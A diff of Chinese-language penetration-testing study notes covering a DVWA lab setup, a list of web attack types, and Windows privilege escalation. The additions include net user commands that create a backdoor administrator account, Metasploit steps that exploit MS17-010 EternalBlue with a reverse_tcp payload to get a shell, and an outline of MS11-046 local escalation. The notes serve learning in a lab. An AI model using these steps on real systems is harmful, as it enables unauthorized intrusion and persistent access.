@@ -17,11 +17,18 @@
 	是目前全世界最多人使用的漏洞扫描器，总共有75000个机构使用。
 	需要到官方获取激活码的
 	
-5.DVWA
+5.DVWA+phpstudy
 	https://dvwa.co.uk
 	是一个容易受攻击的web应用程序，基于php+mysql脆弱的web应用程序。
+	phpstudy(DVWA运行环境)
+	https://www.xp.cn
 
-6.增加点攻击面（w2k3）
+	reCAPTCHA key 是啥？
+	注册地址：https://www.google.com/recaptcha/admin/create
+6.漏洞利用
+	https://www.metasploit.com
+
+7.增加点攻击面（w2k3）
 	关闭防火墙，开启远程桌面，启动iis服务器，添加新组件
 ```
 
@@ -79,8 +86,8 @@
 		$ id
 		
 
-2.漏洞利用
-	metasploit
+2.漏洞利用metasploit
+	https://www.metasploit.com
 	$ msfconsole
 
 3.web漏洞扫描
@@ -92,12 +99,75 @@
 ### 四。服务漏洞
 
 ```
-
+1.ftp
+2.ssh
+3.telnet
+......
 ```
 
 ### 五。攻击方式
 
 ```
+1.暴力破解
+	2.命令执行
+	3.CSRF
+	4.文件包含
+	5.文件上传
+	6.SQL注入
+	7.XSS
+```
+8.提权（windows）
 
+```
+	提升自己在服务器中的权限，获得最大权限，例如：
+	windows下普通用户，通过获取Adminitrator权限；
+	linux执行编译后的程序，从普通用户提升root权限；
+
+	本地提权，远程提权，系统提权，第三方软件提权
+
+	net user username password /add			//新建用户
+	net localgroup administrator username /add 	//用户给组
+
+	在服务器运维一个服务时，最好给予一个普通的运维用户。如果直接用管理员用户，如果存在服务漏洞，会直接影响系统安全
+	中国菜刀软件：
+	https://baijiahao.baidu.com/s?id=1617660724292151222&wfr=spider&for=pc
+
+8.1.提权基础
+		ipconfig /all		//获取ip信息
+		netstat -an		//获取当前主机所有端口开放情况及网络连接情况
+		net start/stop		//查看系统开启的所有服务
+		tasklist /svc		//获取运行进程名称，pid
+		taskkill /?		//删除进程命令
+8.2.辅助工具介绍
+		Windows-Exploit-Suggester
+		https://github.com/mmioimm/windows-exploit-suggester
+		https://github.com/GDSSecurity/Windows-Exploit-Suggester
+		此工具将目标补丁与Microsoft漏洞数据库进行比较，以检测目标上潜在的缺失补丁
+		环境：python2.7,安装xlrd模块
+		python2 -m pip install xldd	//安装xlrd模块
+		
+		systeminfo > win10.txt				//系统信息生成文件
+		python2 windows-exploit-suggester.py --update	//获取远程微软漏洞数据库	
+		python2 windows-exploit-suggester.py --audit -i win10.txt -d 2022-03-27-mssb.xls	//比对
+		
+		
+8.3.在metasploit下直接利用ms17-010的漏洞扫描，利用漏洞
+		msf > search ms17-010				//在metasploit查找漏洞项
+		msf > use auxiliary/scanner/smb_ms17_010	//选择漏洞
+		msf > show options				//显示选项
+		msf > set hosts					//设置主机
+		msf > run					//执行探测
+	利用漏洞
+		msf > use exploit/windows/smb/ms17_010_eternalblue
+		msf > show options
+		msf > set payload windows/x64/neterpreter/reverse_tcp
+		msf > set hosts					//设置主机
+		msf > exploit					//提权
+		metapreter > shell				//获取系统执行终端
+
+8.4.在metasploit下直接利用ms11-046的漏洞（本地提权）
+		1.获取执行cmd命令窗口，使用systeminfo查看当前系统补丁信息
+		2.利用工具对比出没有打的补丁
+		3.把漏洞利用代码exe上传到服务器并运行(然后用net user查看，系统多了一个后门用户)
 ```
 
